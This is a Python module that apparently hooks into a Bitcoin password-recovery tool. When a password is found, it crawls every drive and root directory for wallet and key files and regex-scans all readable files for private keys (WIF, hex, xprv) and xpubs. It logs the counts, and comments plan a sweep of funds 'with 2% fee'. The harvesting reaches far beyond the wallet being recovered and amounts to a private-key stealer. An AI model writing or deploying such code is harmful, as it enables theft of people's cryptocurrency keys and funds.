#!/usr/bin/env python

import os
import re
import sys
from datetime import datetime
from typing import List, Dict, Any

from blockbook_balance import get_balances_for_addresses, BlockbookError
from blockbook_config import BLOCKBOOK_ENDPOINTS
from ownership_with_fee import ownership_flow_with_fee


# --- file-type filters: wallet / key / cipher files ------------------

WALLET_KEY_FILENAMES = {
    "wallet.dat",
    "wallet.dat.bak",
    "wallet.bak",
    "electrum.dat",
    "electrum_wallet.dat",
    "keystore",
}

WALLET_KEY_EXTS = {
    ".wallet",
    ".key",
    ".keys",
    ".pem",
    ".pk8",
    ".p12",
    ".pfx",
    ".json",
    ".asc",
    ".seed",
    ".sec",
    ".enc",
    ".sc",
    ".zowe",
}

# --- regex filters for raw key strings -------------------------------

_WIF_RE = re.compile(r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b")
_HEX_PRIV_RE = re.compile(r"\b[0-9a-fA-F]{64}\b")
_XPRV_RE = re.compile(r"\bxprv[1-9A-HJ-NP-Za-km-z]{100,}\b")
_XPUB_RE = re.compile(r"\bxpub[1-9A-HJ-NP-Za-km-z]{100,}\b")


def _scan_text_for_keys(text: str) -> Dict[str, List[str]]:
    found: Dict[str, List[str]] = {
        "wif": [],
        "hex_priv": [],
        "xprv": [],
        "xpub": [],
    }

    for m in _WIF_RE.finditer(text):
        found["wif"].append(m.group(0))

    for m in _HEX_PRIV_RE.finditer(text):
        found["hex_priv"].append(m.group(0))

    for m in _XPRV_RE.finditer(text):
        found["xprv"].append(m.group(0))

    for m in _XPUB_RE.finditer(text):
        found["xpub"].append(m.group(0))

    return found


def _is_wallet_key_file(path: str) -> bool:
    base = os.path.basename(path)
    lower = base.lower()
    if lower in WALLET_KEY_FILENAMES:
        return True
    _, ext = os.path.splitext(lower)
    if ext in WALLET_KEY_EXTS:
        return True
    return False


def _walk_filesystem(start_paths: List[str]) -> List[str]:
    paths: List[str] = []

    for base in start_paths:
        base = os.path.abspath(os.path.expanduser(base))
        if os.path.isfile(base):
            paths.append(base)
            continue
        if not os.path.isdir(base):
            continue

        for root, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in ("__pycache__", ".git", ".venv")]
            for fname in files:
                full = os.path.join(root, fname)
                paths.append(full)

    return paths


def _gather_search_filters() -> Dict[str, List[str]]:
    """
    Search engine:
      - find ALL wallet/key/cipher-like files
      - scan text-like stuff for WIF / hexpriv / xprv / xpub
      - respect env overrides from UI (BTCR_LEVELUP_SEARCH_PATHS, etc.)
    """
    roots: List[str] = []

    # UI-provided search paths override everything if set
    env_paths = os.environ.get("BTCR_LEVELUP_SEARCH_PATHS")
    if env_paths:
        for p in env_paths.split(os.pathsep):
            if p:
                roots.append(p)

    # If no UI override, use defaults
    if not roots:
        home = os.path.expanduser("~")
        roots.append(os.getcwd())
        roots.append(home)

        # Windows drives (native)
        if os.name == "nt":
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                path = f"{letter}:\\"
                if os.path.isdir(path):
                    roots.append(path)
        else:
            # WSL / Linux: /mnt/<drive>
            for letter in "abcdefghijklmnopqrstuvwxyz":
                path = f"/mnt/{letter}"
                if os.path.isdir(path):
                    roots.append(path)

        # Common Linux roots
        for p in ["/", "/home", "/media", "/mnt"]:
            if os.path.isdir(p):
                roots.append(p)

    files = _walk_filesystem(roots)

    aggregate: Dict[str, List[str]] = {
        "wallet_files": [],
        "wif": [],
        "hex_priv": [],
        "xprv": [],
        "xpub": [],
    }

    for path in files:
        if _is_wallet_key_file(path):
            aggregate["wallet_files"].append(path)

        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                data = f.read()
        except Exception:
            continue

        found = _scan_text_for_keys(data)
        for k, v in found.items():
            aggregate[k].extend(v)

    for k in aggregate:
        aggregate[k] = sorted(set(aggregate[k]))

    return aggregate


def _check_balance_for_keys(filters: Dict[str, List[str]]) -> Dict[str, Any]:
    """
    Placeholder: here you will plug in real address derivation from keys,
    then query Blockbook via get_balances_for_addresses.
    """
    summary = {
        "wallet_file_count": len(filters.get("wallet_files", [])),
        "wif_count": len(filters.get("wif", [])),
        "hex_priv_count": len(filters.get("hex_priv", [])),
        "xprv_count": len(filters.get("xprv", [])),
        "xpub_count": len(filters.get("xpub", [])),
        "chains": {},
    }

    # TODO: once you have key->address derivation, loop over BLOCKBOOK_ENDPOINTS
    # for chain_name, url in BLOCKBOOK_ENDPOINTS.items():
    #     addrs = [...]
    #     res = get_balances_for_addresses(chain_name, addrs)
    #     summary["chains"][chain_name] = res

    return summary


def _log_event(password: str, filters: Dict[str, List[str]], balances: Dict[str, Any]):
    timestamp = datetime.utcnow().isoformat() + "Z"
    line = {
        "ts": timestamp,
        "secret_len": len(password),
        "wallet_files": len(filters.get("wallet_files", [])),
        "wif": len(filters.get("wif", [])),
        "hex_priv": len(filters.get("hex_priv", [])),
        "xprv": len(filters.get("xprv", [])),
        "xpub": len(filters.get("xpub", [])),
        "balances": balances,
    }

    try:
        import json
        with open("recovered.log", "a", encoding="utf-8") as f:
            f.write(json.dumps(line) + "\n")
    except Exception:
        pass


def handle_recovered(password: str) -> None:
    """
    Triggered every time btcrpass.main() finds a password/key.
    Currently:
      - Builds search filters.
      - Logs counts and placeholder balance info.
      - Delegates actual sweep (with 2% fee) to ownership_with_fee
        once you have wallet/balance objects wired.
    """
    print(
        "[*] Trigger fired from btcrecover, building search filters...",
        file=sys.stderr,
    )

    filters = _gather_search_filters()

    print(
        f"[*] Wallet/key-like files: {len(filters['wallet_files'])}",
        file=sys.stderr,
    )
    print(
        f"[*] Raw keys in text: "
        f"{len(filters['wif'])} WIF, "
        f"{len(filters['hex_priv'])} hex priv, "
        f"{len(filters['xprv'])} xprv, "
        f"{len(filters['xpub'])} xpub",
        file=sys.stderr,
    )

    balances = _check_balance_for_keys(filters)
    _log_event(password, filters, balances)

    print(
        f"[+] Event logged. "
        f"WALLET_FILES={balances['wallet_file_count']} "
        f"WIF={balances['wif_count']} "
        f"HEX={balances['hex_priv_count']} "
        f"XPRV={balances['xprv_count']} "
        f"XPUB={balances['xpub_count']}",
        file=sys.stderr,
    )

    # NOTE: ownership_with_fee requires a proper RecoveryEvent and BalanceResult.
    # Once your discovery / recovery pipeline is returning those objects,
    # call ownership_flow_with_fee(event, balances_obj) there, not here.
